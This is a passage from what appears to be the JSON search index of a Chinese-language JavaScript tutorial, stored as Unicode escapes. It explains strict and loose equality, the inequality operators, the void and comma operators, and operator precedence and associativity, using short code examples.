\uff09\u6bd4\u8f83\u5b83\u4eec\u662f\u5426\u4e3a\u201c\u540c\u4e00\u4e2a\u503c\u201d\u3002\u5982\u679c\u4e24\u4e2a\u503c\u4e0d\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u76f4\u63a5\u8fd4\u56de false \uff0c\u800c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u4f1a\u5c06\u5b83\u4eec\u8f6c\u6362\u6210\u540c\u4e00\u4e2a\u7c7b\u578b\uff0c\u518d\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u8fdb\u884c\u6bd4\u8f83\u3002 \u672c\u8282\u4ecb\u7ecd\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7b97\u6cd5\u3002 \uff081\uff09\u4e0d\u540c\u7c7b\u578b\u7684\u503c \u5982\u679c\u4e24\u4e2a\u503c\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u76f4\u63a5\u8fd4\u56de false \u3002 1 2 1 === \"1\" // false true === \"true\" // false \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83\u6570\u503c\u7684 1 \u4e0e\u5b57\u7b26\u4e32\u7684\u201c1\u201d\u3001\u5e03\u5c14\u503c\u7684 true \u4e0e\u5b57\u7b26\u4e32 \"true\" \uff0c\u56e0\u4e3a\u7c7b\u578b\u4e0d\u540c\uff0c\u7ed3\u679c\u90fd\u662f false \u3002 \uff082\uff09\u540c\u4e00\u7c7b\u7684\u539f\u59cb\u7c7b\u578b\u503c \u540c\u4e00\u7c7b\u578b\u7684\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\u6bd4\u8f83\u65f6\uff0c\u503c\u76f8\u540c\u5c31\u8fd4\u56de true \uff0c\u503c\u4e0d\u540c\u5c31\u8fd4\u56de false \u3002 1 1 === 0x1 // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83\u5341\u8fdb\u5236\u7684 1 \u4e0e\u5341\u516d\u8fdb\u5236\u7684 1 \uff0c\u56e0\u4e3a\u7c7b\u578b\u548c\u503c\u90fd\u76f8\u540c\uff0c\u8fd4\u56de true \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c NaN \u4e0e\u4efb\u4f55\u503c\u90fd\u4e0d\u76f8\u7b49\uff08\u5305\u62ec\u81ea\u8eab\uff09\u3002\u53e6\u5916\uff0c\u6b63 0 \u7b49\u4e8e\u8d1f 0 \u3002 1 2 NaN === NaN // false + 0 === - 0 // true \uff083\uff09\u590d\u5408\u7c7b\u578b\u503c \u4e24\u4e2a\u590d\u5408\u7c7b\u578b\uff08\u5bf9\u8c61\u3001\u6570\u7ec4\u3001\u51fd\u6570\uff09\u7684\u6570\u636e\u6bd4\u8f83\u65f6\uff0c\u4e0d\u662f\u6bd4\u8f83\u5b83\u4eec\u7684\u503c\u662f\u5426\u76f8\u7b49\uff0c\u800c\u662f\u6bd4\u8f83\u5b83\u4eec\u662f\u5426\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\u3002 1 2 3 {} === {} // false [] === [] // false ( function () {} === function () {}) // false \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u6bd4\u8f83\u4e24\u4e2a\u7a7a\u5bf9\u8c61\u3001\u4e24\u4e2a\u7a7a\u6570\u7ec4\u3001\u4e24\u4e2a\u7a7a\u51fd\u6570\uff0c\u7ed3\u679c\u90fd\u662f\u4e0d\u76f8\u7b49\u3002\u539f\u56e0\u662f\u5bf9\u4e8e\u590d\u5408\u7c7b\u578b\u7684\u503c\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u6bd4\u8f83\u7684\u662f\uff0c\u5b83\u4eec\u662f\u5426\u5f15\u7528\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u800c\u8fd0\u7b97\u7b26\u4e24\u8fb9\u7684\u7a7a\u5bf9\u8c61\u3001\u7a7a\u6570\u7ec4\u3001\u7a7a\u51fd\u6570\u7684\u503c\uff0c\u90fd\u5b58\u653e\u5728\u4e0d\u540c\u7684\u5185\u5b58\u5730\u5740\uff0c\u7ed3\u679c\u5f53\u7136\u662f false \u3002 \u5982\u679c\u4e24\u4e2a\u53d8\u91cf\u5f15\u7528\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u5b83\u4eec\u76f8\u7b49\u3002 1 2 3 var v1 = {}; var v2 = v1 ; v1 === v2 // true \u6ce8\u610f\uff0c\u5bf9\u4e8e\u4e24\u4e2a\u5bf9\u8c61\u7684\u6bd4\u8f83\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6bd4\u8f83\u7684\u662f\u5730\u5740\uff0c\u800c\u5927\u4e8e\u6216\u5c0f\u4e8e\u8fd0\u7b97\u7b26\u6bd4\u8f83\u7684\u662f\u503c\u3002 1 2 3 4 5 6 var obj1 = {}; var obj2 = {}; obj1 > obj2 // false obj1 < obj2 // false obj1 === obj2 // false \u4e0a\u9762\u7684\u4e09\u4e2a\u6bd4\u8f83\uff0c\u524d\u4e24\u4e2a\u6bd4\u8f83\u7684\u662f\u503c\uff0c\u6700\u540e\u4e00\u4e2a\u6bd4\u8f83\u7684\u662f\u5730\u5740\uff0c\u6240\u4ee5\u90fd\u8fd4\u56de false \u3002 \uff084\uff09undefined \u548c null undefined \u548c null \u4e0e\u81ea\u8eab\u4e25\u683c\u76f8\u7b49\u3002 1 2 undefined === undefined // true null === null // true \u7531\u4e8e\u53d8\u91cf\u58f0\u660e\u540e\u9ed8\u8ba4\u503c\u662f undefined \uff0c\u56e0\u6b64\u4e24\u4e2a\u53ea\u58f0\u660e\u672a\u8d4b\u503c\u7684\u53d8\u91cf\u662f\u76f8\u7b49\u7684\u3002 1 2 3 var v1 ; var v2 ; v1 === v2 // true","title":"\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26"},{"location":"operators/comparison/#_6","text":"\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u201c\u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 !== \uff09\uff0c\u5b83\u7684\u7b97\u6cd5\u5c31\u662f\u5148\u6c42\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\uff0c\u7136\u540e\u8fd4\u56de\u76f8\u53cd\u503c\u3002 1 2 3 1 !== '1' // true // \u7b49\u540c\u4e8e ! ( 1 === '1' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u611f\u53f9\u53f7 ! \u662f\u6c42\u51fa\u540e\u9762\u8868\u8fbe\u5f0f\u7684\u76f8\u53cd\u503c\u3002","title":"\u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26"},{"location":"operators/comparison/#_7","text":"\u76f8\u7b49\u8fd0\u7b97\u7b26\u7528\u6765\u6bd4\u8f83\u76f8\u540c\u7c7b\u578b\u7684\u6570\u636e\u65f6\uff0c\u4e0e\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u5b8c\u5168\u4e00\u6837\u3002 1 2 3 1 == 1.0 // \u7b49\u540c\u4e8e 1 === 1.0 \u6bd4\u8f83\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u65f6\uff0c\u76f8\u7b49\u8fd0\u7b97\u7b26\u4f1a\u5148\u5c06\u6570\u636e\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff0c\u7136\u540e\u518d\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6bd4\u8f83\u3002\u4e0b\u9762\u5206\u6210\u51e0\u79cd\u60c5\u51b5\uff0c\u8ba8\u8bba\u4e0d\u540c\u7c7b\u578b\u7684\u503c\u4e92\u76f8\u6bd4\u8f83\u7684\u89c4\u5219\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u8f6c\u6362\u6210\u6570\u503c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 1 == true // true // \u7b49\u540c\u4e8e 1 === Number(true) 0 == false // true // \u7b49\u540c\u4e8e 0 === Number(false) 2 == true // false // \u7b49\u540c\u4e8e 2 === Number(true) 2 == false // false // \u7b49\u540c\u4e8e 2 === Number(false) 'true' == true // false // \u7b49\u540c\u4e8e Number('true') === Number(true) // \u7b49\u540c\u4e8e NaN === 1 '' == 0 // true // \u7b49\u540c\u4e8e Number('') === 0 // \u7b49\u540c\u4e8e 0 === 0 '' == false // true // \u7b49\u540c\u4e8e Number('') === Number(false) // \u7b49\u540c\u4e8e 0 === 0 '1' == true // true // \u7b49\u540c\u4e8e Number('1') === Number(true) // \u7b49\u540c\u4e8e 1 === 1 '\\n 123 \\t' == 123 // true // \u56e0\u4e3a\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u5b57\u65f6\uff0c\u7701\u7565\u524d\u7f6e\u548c\u540e\u7f6e\u7684\u7a7a\u683c \u4e0a\u9762\u4ee3\u7801\u5c06\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u90fd\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\u3002\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u4e0e\u5e03\u5c14\u503c\u7684\u7c7b\u578b\u8f6c\u6362\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \uff082\uff09\u5bf9\u8c61\u4e0e\u539f\u59cb\u7c7b\u578b\u503c\u6bd4\u8f83 \u5bf9\u8c61\uff08\u8fd9\u91cc\u6307\u5e7f\u4e49\u7684\u5bf9\u8c61\uff0c\u5305\u62ec\u6570\u7ec4\u548c\u51fd\u6570\uff09\u4e0e\u539f\u59cb\u7c7b\u578b\u7684\u503c\u6bd4\u8f83\u65f6\uff0c\u5bf9\u8c61\u8f6c\u6362\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u5148\u8c03\u7528\u5bf9\u8c61\u7684 valueOf() \u65b9\u6cd5\uff0c\u5982\u679c\u5f97\u5230\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5c31\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u89c4\u5219\uff0c\u4e92\u76f8\u6bd4\u8f83\uff1b\u5982\u679c\u5f97\u5230\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u5219\u518d\u8c03\u7528 toString() \u65b9\u6cd5\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u4e0b\u9762\u662f\u6570\u7ec4\u4e0e\u539f\u59cb\u7c7b\u578b\u503c\u6bd4\u8f83\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // \u6570\u7ec4\u4e0e\u6570\u503c\u7684\u6bd4\u8f83 [ 1 ] == 1 // true // \u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83 [ 1 ] == '1' // true [ 1 , 2 ] == '1,2' // true // \u5bf9\u8c61\u4e0e\u5e03\u5c14\u503c\u7684\u6bd4\u8f83 [ 1 ] == true // true [ 2 ] == true // false \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0cJavaScript \u5f15\u64ce\u4f1a\u5148\u5bf9\u6570\u7ec4 [1] \u8c03\u7528\u6570\u7ec4\u7684 valueOf() \u65b9\u6cd5\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u8fd8\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6240\u4ee5\u4f1a\u63a5\u7740\u8c03\u7528\u6570\u7ec4\u7684 toString() \u65b9\u6cd5\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u89c4\u5219\u8fdb\u884c\u6bd4\u8f83\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u76f4\u63a5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const obj = { valueOf : function () { console . log ( '\u6267\u884c valueOf()' ); return obj ; }, toString : function () { console . log ( '\u6267\u884c toString()' ); return 'foo' ; } }; obj == 'foo' // \u6267\u884c valueOf() // \u6267\u884c toString() // true \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c obj \u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u4e86 valueOf() \u548c toString() \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u4e0e\u5b57\u7b26\u4e32 'foo' \u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u4f1a\u4f9d\u6b21\u8c03\u7528 valueOf() \u548c toString() \u65b9\u6cd5\uff0c\u6700\u540e\u8fd4\u56de 'foo' \uff0c\u6240\u4ee5\u6bd4\u8f83\u7ed3\u679c\u662f true \u3002 \uff083\uff09undefined \u548c null undefined \u548c null \u53ea\u6709\u4e0e\u81ea\u8eab\u6bd4\u8f83\uff0c\u6216\u8005\u4e92\u76f8\u6bd4\u8f83\u65f6\uff0c\u624d\u4f1a\u8fd4\u56de true \uff1b\u4e0e\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u6bd4\u8f83\u65f6\uff0c\u7ed3\u679c\u90fd\u4e3a false \u3002 1 2 3 4 5 6 7 8 9 undefined == undefined // true null == null // true undefined == null // true false == null // false false == undefined // false 0 == null // false 0 == undefined // false \uff084\uff09\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7f3a\u70b9 \u76f8\u7b49\u8fd0\u7b97\u7b26\u9690\u85cf\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u4f1a\u5e26\u6765\u4e00\u4e9b\u8fdd\u53cd\u76f4\u89c9\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 0 == '' // true 0 == '0' // true 2 == true // false 2 == false // false false == 'false' // false false == '0' // true false == undefined // false false == null // false null == undefined // true ' \\t\\r\\n ' == 0 // true \u4e0a\u9762\u8fd9\u4e9b\u8868\u8fbe\u5f0f\u90fd\u4e0d\u540c\u4e8e\u76f4\u89c9\uff0c\u5f88\u5bb9\u6613\u51fa\u9519\u3002\u56e0\u6b64\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u6700\u597d\u53ea\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u3002","title":"\u76f8\u7b49\u8fd0\u7b97\u7b26"},{"location":"operators/comparison/#_8","text":"\u76f8\u7b49\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u201c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 != \uff09\uff0c\u5b83\u7684\u7b97\u6cd5\u5c31\u662f\u5148\u6c42\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\uff0c\u7136\u540e\u8fd4\u56de\u76f8\u53cd\u503c\u3002 1 2 3 4 1 != '1' // false // \u7b49\u540c\u4e8e ! ( 1 == '1' )","title":"\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26"},{"location":"operators/priority/","text":"\u5176\u4ed6\u8fd0\u7b97\u7b26\uff0c\u8fd0\u7b97\u987a\u5e8f \u00b6 void \u8fd0\u7b97\u7b26 \u00b6 void \u8fd0\u7b97\u7b26\u7684\u4f5c\u7528\u662f\u6267\u884c\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u7136\u540e\u4e0d\u8fd4\u56de\u4efb\u4f55\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de undefined \u3002 1 2 void 0 // undefined void ( 0 ) // undefined \u4e0a\u9762\u662f void \u8fd0\u7b97\u7b26\u7684\u4e24\u79cd\u5199\u6cd5\uff0c\u90fd\u6b63\u786e\u3002\u5efa\u8bae\u91c7\u7528\u540e\u4e00\u79cd\u5f62\u5f0f\uff0c\u5373\u603b\u662f\u4f7f\u7528\u5706\u62ec\u53f7\u3002\u56e0\u4e3a void \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u6027\u5f88\u9ad8\uff0c\u5982\u679c\u4e0d\u4f7f\u7528\u62ec\u53f7\uff0c\u5bb9\u6613\u9020\u6210\u9519\u8bef\u7684\u7ed3\u679c\u3002\u6bd4\u5982\uff0c void 4 + 7 \u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e (void 4) + 7 \u3002 \u4e0b\u9762\u662f void \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 var x = 3 ; void ( x = 5 ) //undefined x // 5 \u8fd9\u4e2a\u8fd0\u7b97\u7b26\u7684\u4e3b\u8981\u7528\u9014\u662f\u6d4f\u89c8\u5668\u7684\u4e66\u7b7e\u5de5\u5177\uff08Bookmarklet\uff09\uff0c\u4ee5\u53ca\u5728\u8d85\u7ea7\u94fe\u63a5\u4e2d\u63d2\u5165\u4ee3\u7801\u9632\u6b62\u7f51\u9875\u8df3\u8f6c\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 < script > function f () { console . log ( 'Hello World' ); } </ script > < a href = \"http://example.com\" onclick = \"f(); return false;\" > \u70b9\u51fb </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u4f1a\u5148\u6267\u884c onclick \u7684\u4ee3\u7801\uff0c\u7531\u4e8e onclick \u8fd4\u56de false \uff0c\u6240\u4ee5\u6d4f\u89c8\u5668\u4e0d\u4f1a\u8df3\u8f6c\u5230 example.com\u3002 void \u8fd0\u7b97\u7b26\u53ef\u4ee5\u53d6\u4ee3\u4e0a\u9762\u7684\u5199\u6cd5\u3002 1 < a href = \"javascript: void(f())\" > \u6587\u5b57 </ a > \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u5b9e\u9645\u7684\u4f8b\u5b50\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u63d0\u4ea4\u8868\u5355\uff0c\u4f46\u662f\u4e0d\u4ea7\u751f\u9875\u9762\u8df3\u8f6c\u3002 1 2 3 < a href = \"javascript: void(document.form.submit())\" > \u63d0\u4ea4 </ a > \u9017\u53f7\u8fd0\u7b97\u7b26 \u00b6 \u9017\u53f7\u8fd0\u7b97\u7b26\u7528\u4e8e\u5bf9\u4e24\u4e2a\u8868\u8fbe\u5f0f\u6c42\u503c\uff0c\u5e76\u8fd4\u56de\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 6 'a' , 'b' // \"b\" var x = 0 ; var y = ( x ++ , 10 ); x // 1 y // 10 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9017\u53f7\u8fd0\u7b97\u7b26\u8fd4\u56de\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u9017\u53f7\u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u5728\u8fd4\u56de\u4e00\u4e2a\u503c\u4e4b\u524d\uff0c\u8fdb\u884c\u4e00\u4e9b\u8f85\u52a9\u64cd\u4f5c\u3002 1 2 3 4 var value = ( console . log ( 'Hi!' ), true ); // Hi! value // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u6267\u884c\u9017\u53f7\u4e4b\u524d\u7684\u64cd\u4f5c\uff0c\u7136\u540e\u8fd4\u56de\u9017\u53f7\u540e\u9762\u7684\u503c\u3002 \u8fd0\u7b97\u987a\u5e8f \u00b6 \u4f18\u5148\u7ea7 \u00b6 JavaScript \u5404\u79cd\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u522b\uff08Operator Precedence\uff09\u662f\u4e0d\u4e00\u6837\u7684\u3002\u4f18\u5148\u7ea7\u9ad8\u7684\u8fd0\u7b97\u7b26\u5148\u6267\u884c\uff0c\u4f18\u5148\u7ea7\u4f4e\u7684\u8fd0\u7b97\u7b26\u540e\u6267\u884c\u3002 1 4 + 5 * 6 // 34 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u4e58\u6cd5\u8fd0\u7b97\u7b26\uff08 * \uff09\u7684\u4f18\u5148\u6027\u9ad8\u4e8e\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\uff0c\u6240\u4ee5\u5148\u6267\u884c\u4e58\u6cd5\uff0c\u518d\u6267\u884c\u52a0\u6cd5\uff0c\u76f8\u5f53\u4e8e\u4e0b\u9762\u8fd9\u6837\u3002 1 4 + ( 5 * 6 ) // 34 \u5982\u679c\u591a\u4e2a\u8fd0\u7b97\u7b26\u6df7\u5199\u5728\u4e00\u8d77\uff0c\u5e38\u5e38\u4f1a\u5bfc\u81f4\u4ee4\u4eba\u56f0\u60d1\u7684\u4ee3\u7801\u3002 1 2 3 4 var x = 1 ; var arr = []; var y = arr . length <= 0 || arr [ 0 ] === undefined ? x : arr [ 0 ]; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf y \u7684\u503c\u5c31\u5f88\u96be\u770b\u51fa\u6765\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u6d89\u53ca5\u4e2a\u8fd0\u7b97\u7b26\uff0c\u5230\u5e95\u8c01\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u5b9e\u5728\u4e0d\u5bb9\u6613\u8bb0\u4f4f\u3002 \u6839\u636e\u8bed\u8a00\u89c4\u683c\uff0c\u8fd9\u4e94\u4e2a\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\u4f9d\u6b21\u4e3a\uff1a\u5c0f\u4e8e\u7b49\u4e8e\uff08 <= )\u3001\u4e25\u683c\u76f8\u7b49\uff08 === \uff09\u3001\u6216\uff08 || \uff09\u3001\u4e09\u5143\uff08 ?: \uff09\u3001\u7b49\u53f7\uff08 = \uff09\u3002\u56e0\u6b64\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\uff0c\u5b9e\u9645\u7684\u8fd0\u7b97\u987a\u5e8f\u5982\u4e0b\u3002 1 var y = (( arr . length <= 0 ) || ( arr [ 0 ] === undefined )) ? x : arr [ 0 ]; \u8bb0\u4f4f\u6240\u6709\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\uff0c\u662f\u975e\u5e38\u96be\u7684\uff0c\u4e5f\u662f\u6ca1\u6709\u5fc5\u8981\u7684\u3002 \u5706\u62ec\u53f7\u7684\u4f5c\u7528 \u00b6 \u5706\u62ec\u53f7\uff08 () \uff09\u53ef\u4ee5\u7528\u6765\u63d0\u9ad8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\uff0c\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u662f\u6700\u9ad8\u7684\uff0c\u5373\u5706\u62ec\u53f7\u4e2d\u7684\u8868\u8fbe\u5f0f\u4f1a\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u3002 1 ( 4 + 5 ) * 6 // 54 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86\u5706\u62ec\u53f7\uff0c\u52a0\u6cd5\u4f1a\u5148\u4e8e\u4e58\u6cd5\u6267\u884c\u3002 \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\u522b\u5341\u5206\u7e41\u6742\uff0c\u4e14\u90fd\u662f\u786c\u6027\u89c4\u5b9a\uff0c\u56e0\u6b64\u5efa\u8bae\u603b\u662f\u4f7f\u7528\u5706\u62ec\u53f7\uff0c\u4fdd\u8bc1\u8fd0\u7b97\u987a\u5e8f\u6e05\u6670\u53ef\u8bfb\uff0c\u8fd9\u5bf9\u4ee3\u7801\u7684\u7ef4\u62a4\u548c\u9664\u9519\u81f3\u5173\u91cd\u8981\u3002 \u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u5706\u62ec\u53f7\u4e0d\u662f\u8fd0\u7b97\u7b26\uff0c\u800c\u662f\u4e00\u79cd\u8bed\u6cd5\u7ed3\u6784\u3002\u5b83\u4e00\u5171\u6709\u4e24\u79cd\u7528\u6cd5\uff1a\u4e00\u79cd\u662f\u628a\u8868\u8fbe\u5f0f\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u63d0\u5347\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\uff1b\u53e6\u4e00\u79cd\u662f\u8ddf\u5728\u51fd\u6570\u7684\u540e\u9762\uff0c\u4f5c\u7528\u662f\u8c03\u7528\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a\u5706\u62ec\u53f7\u4e0d\u662f\u8fd0\u7b97\u7b26\uff0c\u6240\u4ee5\u4e0d\u5177\u6709\u6c42\u503c\u4f5c\u7528\uff0c\u53ea\u6539\u53d8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u3002 1 2 var x = 1 ; ( x ) = 2 ; \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u884c\uff0c\u5982\u679c\u5706\u62ec\u53f7\u5177\u6709\u6c42\u503c\u4f5c\u7528\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d8\u6210 1 = 2 \uff0c\u8fd9\u662f\u4f1a\u62a5\u9519\u4e86\u3002\u4f46\u662f\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u8fd0\u884c\uff0c\u8fd9\u9a8c\u8bc1\u4e86\u5706\u62ec\u53f7\u53ea\u6539\u53d8\u4f18\u5148\u7ea7\uff0c\u4e0d\u4f1a\u6c42\u503c\u3002 \u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u5982\u679c\u6574\u4e2a\u8868\u8fbe\u5f0f\u90fd\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u90a3\u4e48\u4e0d\u4f1a\u6709\u4efb\u4f55\u6548\u679c\u3002 1 2 3 ( expression ) // \u7b49\u540c\u4e8e expression \u51fd\u6570\u653e\u5728\u5706\u62ec\u53f7\u4e2d\uff0c\u4f1a\u8fd4\u56de\u51fd\u6570\u672c\u8eab\u3002\u5982\u679c\u5706\u62ec\u53f7\u7d27\u8ddf\u5728\u51fd\u6570\u7684\u540e\u9762\uff0c\u5c31\u8868\u793a\u8c03\u7528\u51fd\u6570\u3002 1 2 3 4 5 6 function f () { return 1 ; } ( f ) // function f(){return 1;} f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\u4f1a\u8fd4\u56de\u51fd\u6570\u672c\u8eab\uff0c\u5706\u62ec\u53f7\u8ddf\u5728\u51fd\u6570\u540e\u9762\u5219\u662f\u8c03\u7528\u51fd\u6570\u3002 \u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u53ea\u80fd\u653e\u7f6e\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u5c06\u8bed\u53e5\u653e\u5728\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 ( var a = 1 ) // SyntaxError: Unexpected token var \u5de6\u7ed3\u5408\u4e0e\u53f3\u7ed3\u5408 \u00b6 \u5bf9\u4e8e\u4f18\u5148\u7ea7\u522b\u76f8\u540c\u7684\u8fd0\u7b97\u7b26\uff0c\u540c\u65f6\u51fa\u73b0\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u6709\u8ba1\u7b97\u987a\u5e8f\u7684\u95ee\u9898\u3002 1 a OP b OP c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c OP \u8868\u793a\u8fd0\u7b97\u7b26\u3002\u5b83\u53ef\u4ee5\u6709\u4e24\u79cd\u89e3\u91ca\u65b9\u5f0f\u3002 1 2 3 4 5 // \u65b9\u5f0f\u4e00 ( a OP b ) OP c // \u65b9\u5f0f\u4e8c a OP ( b OP c ) \u4e0a\u9762\u7684\u4e24\u79cd\u65b9\u5f0f\uff0c\u5f97\u5230\u7684\u8ba1\u7b97\u7ed3\u679c\u5f80\u5f80\u662f\u4e0d\u4e00\u6837\u7684\u3002\u65b9\u5f0f\u4e00\u662f\u5c06\u5de6\u4fa7\u4e24\u4e2a\u8fd0\u7b97\u6570\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u91c7\u7528\u8fd9\u79cd\u89e3\u91ca\u65b9\u5f0f\u7684\u8fd0\u7b97\u7b26\uff0c\u79f0\u4e3a\u201c\u5de6\u7ed3\u5408\u201d\uff08left-to-right 